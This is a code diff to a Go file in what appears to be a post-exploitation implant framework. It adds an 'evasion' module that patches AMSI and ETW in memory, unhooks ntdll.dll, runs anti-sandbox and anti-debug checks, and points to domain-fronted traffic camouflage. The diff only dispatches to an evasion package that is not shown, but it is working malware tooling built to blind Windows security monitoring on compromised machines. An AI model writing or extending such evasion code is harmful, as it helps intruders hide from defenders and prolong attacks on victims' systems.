@@ -8,6 +8,8 @@ import (
 	"path/filepath"
 	"runtime"
 	"time"
+
+	"bty/src/go/internal/evasion"
 )
 
 // Module represents a dynamically loadable post-exploitation module.
@@ -125,6 +127,14 @@ func (r *ModuleRegistry) registerDefaults() {
 		Description: "Continuous screen monitoring (usage: watch:interval_seconds)",
 		Platform:    "all",
 		Execute:     watchRun,
+	}
+
+	// Evasion status
+	r.modules["evasion"] = &Module{
+		Name:        "evasion",
+		Description: "Check evasion status and apply bypasses (usage: evasion:status|amsi|etw|ntdll|camouflage)",
+		Platform:    "all",
+		Execute:     evasionRun,
 	}
 }
 
@@ -745,6 +755,88 @@ func min(a, b int) int {
 		return a
 	}
 	return b
+}
+
+func evasionRun(args string) string {
+	switch args {
+	case "status":
+		var output string
+		output += "=== Evasion Status ===\n\n"
+
+		if runtime.GOOS == "windows" {
+			amsiStatus := evasion.CheckAMSIStatus()
+			output += fmt.Sprintf("AMSI:       %s\n", map[bool]string{true: "ACTIVE (not patched)", false: "BYPASSED (patched)"}[amsiStatus])
+
+			etwStatus := evasion.CheckETWStatus()
+			etwPatched := false
+			for _, v := range etwStatus {
+				if v {
+					etwPatched = true
+					break
+				}
+			}
+			output += fmt.Sprintf("ETW:        %s\n", map[bool]string{true: "BYPASSED (patched)", false: "ACTIVE (not patched)"}[etwPatched])
+		}
+
+		output += fmt.Sprintf("OS:         %s/%s\n", runtime.GOOS, runtime.GOARCH)
+		output += fmt.Sprintf("Anti-sandbox: Available\n")
+		output += fmt.Sprintf("Sleep mask:   Active\n")
+		output += fmt.Sprintf("Camouflage:   Available\n")
+
+		return output
+
+	case "amsi":
+		if runtime.GOOS != "windows" {
+			return "AMSI bypass is Windows-only"
+		}
+		r1 := evasion.PatchAmsiInMemory()
+		r2 := evasion.PatchAmsiScanString()
+		return fmt.Sprintf("AMSI Bypass Results:\n  AmsiScanBuffer: %v (%s)\n  AmsiScanString: %v (%s)",
+			r1.Success, r1.Note, r2.Success, r2.Note)
+
+	case "etw":
+		if runtime.GOOS != "windows" {
+			return "ETW bypass is Windows-only"
+		}
+		results := evasion.PatchAllETW()
+		var output string
+		for _, r := range results {
+			output += fmt.Sprintf("  %v: %s\n", r.Success, r.Note)
+		}
+		return "ETW Bypass Results:\n" + output
+
+	case "ntdll":
+		if runtime.GOOS != "windows" {
+			return "NTDLL unhook is Windows-only"
+		}
+		evasion.UnhookNtdll()
+		return "NTDLL unhook initiated (restoring original syscall stubs from disk)"
+
+	case "camouflage":
+		return "Camouflage mode: Use ConnectCamouflaged() for domain-fronted TLS with HTTP preamble"
+
+	case "sandbox":
+		if evasion.AntiSandbox() {
+			return "Anti-sandbox: Environment appears to be a real machine"
+		}
+		return "Anti-sandbox: VM/sandbox environment detected"
+
+	case "debug":
+		if evasion.AntiDebug() {
+			return "Anti-debug: No debugger detected"
+		}
+		return "Anti-debug: Debugger DETECTED!"
+
+	default:
+		return `Evasion module commands:
+  evasion:status    — Check current evasion status
+  evasion:amsi      — Apply AMSI bypass (Windows)
+  evasion:etw       — Apply ETW bypass (Windows)
+  evasion:ntdll     — Unhook ntdll.dll (Windows)
+  evasion:camouflage — Enable traffic camouflage
+  evasion:sandbox   — Run anti-sandbox checks
+  evasion:debug     — Run anti-debug checks`
+	}
 }
 
 // Ensure log imported
